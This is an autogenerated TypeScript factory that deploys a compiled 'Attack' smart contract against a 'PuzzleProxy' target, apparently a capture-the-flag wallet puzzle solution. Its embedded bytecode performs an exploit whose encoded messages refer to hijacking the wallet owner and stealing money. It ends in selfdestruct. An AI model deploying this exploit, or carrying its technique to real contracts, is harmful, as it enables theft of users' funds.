/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Attack, AttackInterface } from "../Attack";

const _abi = [
  {
    inputs: [
      {
        internalType: "contract PuzzleProxy",
        name: "_p",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b50604051610f48380380610f488339818101604052610032919081019061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b610e28806101206000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461002e57610029565b3661002957005b600080fd5b34801561003a57600080fd5b50610043610045565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6376746306040518263ffffffff1660e01b815260040161009f9190610b63565b600060405180830381600087803b1580156100b957600080fd5b505af11580156100cd573d6000803e3d6000fd5b5050505060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b815260040160206040518083038186803b15801561015457600080fd5b505afa158015610168573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525061018c91908101906108d7565b73ffffffffffffffffffffffffffffffffffffffff16146101e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101d990610c1c565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1663e43252d7306040518263ffffffff1660e01b815260040161021b9190610b63565b600060405180830381600087803b15801561023557600080fd5b505af1158015610249573d6000803e3d6000fd5b505050506060600260405190808252806020026020018201604052801561028457816020015b606081526020019060019003908161026f5790505b5090506040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050508160008151811061031757fe5b60200260200101819052506060600160405190808252806020026020018201604052801561035957816020015b60608152602001906001900390816103445790505b5090506040516024016040516020818303038152906040527fd0e30db0000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050816000815181106103ec57fe5b6020026020010181905250806040516024016104089190610bba565b6040516020818303038152906040527fac9650d8000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050508260018151811061049257fe5b602002602001018190525066038d7ea4c680004710156104e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104de90610c5c565b60405180910390fd5b8273ffffffffffffffffffffffffffffffffffffffff1663ac9650d866038d7ea4c68000846040518363ffffffff1660e01b81526004016105289190610bba565b6000604051808303818588803b15801561054157600080fd5b505af1158015610555573d6000803e3d6000fd5b505050505060008373ffffffffffffffffffffffffffffffffffffffff166327e235e3306040518263ffffffff1660e01b81526004016105959190610b63565b60206040518083038186803b1580156105ad57600080fd5b505afa1580156105c1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052506105e59190810190610900565b90508373ffffffffffffffffffffffffffffffffffffffff16318114610640576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161063790610c3c565b60405180910390fd5b8373ffffffffffffffffffffffffffffffffffffffff1663b61d27f630836040518363ffffffff1660e01b815260040161067b929190610b7e565b600060405180830381600087803b15801561069557600080fd5b505af11580156106a9573d6000803e3d6000fd5b5050505060008473ffffffffffffffffffffffffffffffffffffffff163114610707576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fe90610bfc565b60405180910390fd5b8373ffffffffffffffffffffffffffffffffffffffff16639d51d9b73273ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016107569190610c7c565b600060405180830381600087803b15801561077057600080fd5b505af1158015610784573d6000803e3d6000fd5b505050503273ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f851a4406040518163ffffffff1660e01b815260040160206040518083038186803b15801561080657600080fd5b505afa15801561081a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525061083e91908101906108d7565b73ffffffffffffffffffffffffffffffffffffffff1614610894576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088b90610bdc565b60405180910390fd5b3273ffffffffffffffffffffffffffffffffffffffff16ff5b6000815190506108bc81610dc4565b92915050565b6000815190506108d181610ddb565b92915050565b6000602082840312156108e957600080fd5b60006108f7848285016108ad565b91505092915050565b60006020828403121561091257600080fd5b6000610920848285016108c2565b91505092915050565b600061093583836109c1565b905092915050565b61094681610d4a565b82525050565b600061095782610ca7565b6109618185610cca565b93508360208202850161097385610c97565b8060005b858110156109af57848403895281516109908582610929565b945061099b83610cbd565b925060208a01995050600181019050610977565b50829750879550505050505092915050565b60006109cc82610cb2565b6109d68185610cdb565b93506109e6818560208601610d80565b6109ef81610db3565b840191505092915050565b6000610a07600e83610cfd565b91507f61747461636b206661696c65642e0000000000000000000000000000000000006000830152602082019050919050565b6000610a47601583610cfd565b91507f6d6f6e6579207769746864726177206661696c656400000000000000000000006000830152602082019050919050565b6000610a87601d83610cfd565b91507f77616c6c6574206f776e65722068696a61636b696e67206661696c65640000006000830152602082019050919050565b6000610ac7601583610cfd565b91507f6661696c656420737465616c696e67206d6f6e657900000000000000000000006000830152602082019050919050565b6000610b07601483610cfd565b91507f696e73756666696369656e742062616c616e63650000000000000000000000006000830152602082019050919050565b6000610b47600083610cec565b9150600082019050919050565b610b5d81610d40565b82525050565b6000602082019050610b78600083018461093d565b92915050565b6000606082019050610b93600083018561093d565b610ba06020830184610b54565b8181036040830152610bb181610b3a565b90509392505050565b60006020820190508181036000830152610bd4818461094c565b905092915050565b60006020820190508181036000830152610bf5816109fa565b9050919050565b60006020820190508181036000830152610c1581610a3a565b9050919050565b60006020820190508181036000830152610c3581610a7a565b9050919050565b60006020820190508181036000830152610c5581610aba565b9050919050565b60006020820190508181036000830152610c7581610afa565b9050919050565b6000602082019050610c916000830184610b54565b92915050565b6000819050602082019050919050565b600081519050919050565b600081519050919050565b6000602082019050919050565b600082825260208201905092915050565b600082825260208201905092915050565b600082825260208201905092915050565b600082825260208201905092915050565b6000610d1982610d20565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610d5582610d5c565b9050919050565b6000610d6782610d6e565b9050919050565b6000610d7982610d20565b9050919050565b60005b83811015610d9e578082015181840152602081019050610d83565b83811115610dad576000848401525b50505050565b6000601f19601f8301169050919050565b610dcd81610d0e565b8114610dd857600080fd5b50565b610de481610d40565b8114610def57600080fd5b5056fea26469706673582212206494f081b5ee1c06e847f9eec0da770c4a244167b56ea0263802377c48e9079d64736f6c63430006020033";

type AttackConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack__factory extends ContractFactory {
  constructor(...args: AttackConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Attack";
  }

  deploy(
    _p: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Attack> {
    return super.deploy(_p, overrides || {}) as Promise<Attack>;
  }
  getDeployTransaction(
    _p: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_p, overrides || {});
  }
  attach(address: string): Attack {
    return super.attach(address) as Attack;
  }
  connect(signer: Signer): Attack__factory {
    return super.connect(signer) as Attack__factory;
  }
  static readonly contractName: "Attack";
  public readonly contractName: "Attack";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackInterface {
    return new utils.Interface(_abi) as AttackInterface;
  }
  static connect(address: string, signerOrProvider: Signer | Provider): Attack {
    return new Contract(address, _abi, signerOrProvider) as Attack;
  }
}
